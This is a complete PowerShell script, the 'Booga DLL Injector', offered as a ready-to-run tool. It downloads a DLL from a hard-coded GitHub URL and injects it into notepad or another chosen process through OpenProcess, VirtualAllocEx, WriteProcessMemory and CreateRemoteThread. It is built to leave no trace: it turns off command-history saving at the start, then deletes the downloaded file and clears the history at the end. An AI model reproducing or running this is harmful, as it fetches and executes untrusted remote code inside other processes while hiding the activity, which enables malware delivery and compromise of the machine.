<#
.SYNOPSIS
    Booga DLL Injector - Silent & Clean
.DESCRIPTION
    Downloads and injects Booga DLL into target process
.PARAMETER Process
    Target process name (default: notepad)
.PARAMETER Url
    DLL URL (default: GitHub hosted)
#>

param(
    [string]$Process = "notepad",
    [string]$Url = "https://github.com/patzagon2-beep/highm/raw/main/Booga1.dll"
)

$ErrorActionPreference = 'Continue'

# Check Admin
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (!$isAdmin) {
    Write-Host "========================================" -ForegroundColor Red
    Write-Host "   ERROR: Not running as Administrator!" -ForegroundColor Red
    Write-Host "========================================" -ForegroundColor Red
    Write-Host ""
    Write-Host "Please run PowerShell as Administrator" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

# ========================================
# Disable History
# ========================================
Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   BOOGA DLL INJECTOR" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# ========================================
# Download DLL
# ========================================
Write-Host "[*] Downloading DLL..." -ForegroundColor Cyan
$tmp = "$env:TEMP\$([guid]::NewGuid())"
New-Item -ItemType Directory -Path $tmp -Force | Out-Null
$dll = "$tmp\booga.dll"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
try {
    (New-Object Net.WebClient).DownloadFile($Url, $dll)
    Write-Host "[+] Downloaded: $dll" -ForegroundColor Green
} catch {
    Write-Host "[-] Download failed!" -ForegroundColor Red
    Write-Host "    Error: $_" -ForegroundColor Red
    Write-Host ""
    Write-Host "Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

if (!(Test-Path $dll)) {
    Write-Host "[-] DLL not found after download!" -ForegroundColor Red
    Write-Host ""
    Write-Host "Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

# ========================================
# Find or Start Process
# ========================================
Write-Host "[*] Looking for $Process..." -ForegroundColor Cyan
$targetProc = Get-Process -Name $Process -ErrorAction SilentlyContinue | Select-Object -First 1

if (!$targetProc) {
    Write-Host "[*] Starting $Process..." -ForegroundColor Yellow
    
    if ($Process -eq "notepad") {
        Start-Process "C:\Windows\System32\notepad.exe"
    } else {
        Start-Process $Process
    }
    
    Start-Sleep -Seconds 2
    $targetProc = Get-Process -Name $Process -ErrorAction SilentlyContinue | Select-Object -First 1
    
    if (!$targetProc) {
        Write-Host "[-] Failed to start $Process" -ForegroundColor Red
        exit 1
    }
}

$processId = $targetProc.Id
Write-Host "[+] Target: $Process (PID: $processId)" -ForegroundColor Green

# ========================================
# Inject DLL
# ========================================
Write-Host "[*] Injecting DLL..." -ForegroundColor Cyan

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

try {
    # Open process
    $hProcess = [Kernel32]::OpenProcess(0x1F0FFF, $false, $processId)
    if ($hProcess -eq [IntPtr]::Zero) {
        throw "OpenProcess failed"
    }
    
    # Get LoadLibraryA address
    $hKernel32 = [Kernel32]::GetModuleHandle("kernel32.dll")
    $pLoadLibrary = [Kernel32]::GetProcAddress($hKernel32, "LoadLibraryA")
    if ($pLoadLibrary -eq [IntPtr]::Zero) {
        throw "GetProcAddress failed"
    }
    
    # Allocate memory
    $dllBytes = [Text.Encoding]::ASCII.GetBytes($dll + "`0")
    $pRemoteMem = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllBytes.Length, 0x1000, 0x04)
    if ($pRemoteMem -eq [IntPtr]::Zero) {
        throw "VirtualAllocEx failed"
    }
    
    # Write DLL path
    $bytesWritten = 0
    $writeResult = [Kernel32]::WriteProcessMemory($hProcess, $pRemoteMem, $dllBytes, $dllBytes.Length, [ref]$bytesWritten)
    if (!$writeResult) {
        throw "WriteProcessMemory failed"
    }
    
    # Create remote thread
    $hThread = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $pLoadLibrary, $pRemoteMem, 0, [IntPtr]::Zero)
    if ($hThread -eq [IntPtr]::Zero) {
        throw "CreateRemoteThread failed"
    }
    
    Write-Host "[+] DLL Injected!" -ForegroundColor Green
    Write-Host "" -ForegroundColor White
    Write-Host "Console window should appear now." -ForegroundColor Yellow
    Write-Host "If notepad closes, the console will close too." -ForegroundColor Yellow
    
    [Kernel32]::CloseHandle($hThread) | Out-Null
    [Kernel32]::CloseHandle($hProcess) | Out-Null
    
} catch {
    Write-Host "[-] Injection failed: $_" -ForegroundColor Red
    exit 1
}

# ========================================
# Cleanup
# ========================================
Start-Sleep -Seconds 2
Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
Clear-History -ErrorAction SilentlyContinue

Write-Host "[+] Done!" -ForegroundColor Green
